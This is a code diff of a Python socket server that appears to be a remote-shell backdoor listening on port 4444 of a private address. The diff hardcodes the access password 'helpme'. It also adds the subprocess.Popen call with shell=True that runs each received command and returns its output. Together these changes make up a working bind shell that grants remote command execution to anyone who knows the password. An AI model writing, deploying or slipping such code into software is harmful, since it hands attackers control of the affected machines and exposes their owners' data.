@@ -27,7 +27,7 @@ def checkPass(password, client, client_addr):
 
 HOST = '10.0.2.5'
 PORT = 4444 
-real_password = ""
+real_password = "helpme"
 passwords_match = False
 server = socket.socket()
 server.bind((HOST, PORT))
@@ -47,6 +47,7 @@ while passwords_match == True:
         passwords_match = checkPass(password, client, client_addr)
         print(passwords_match)
     else:
+        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
         output_error = op.stderr.read()
         print("[-] Sending response...")
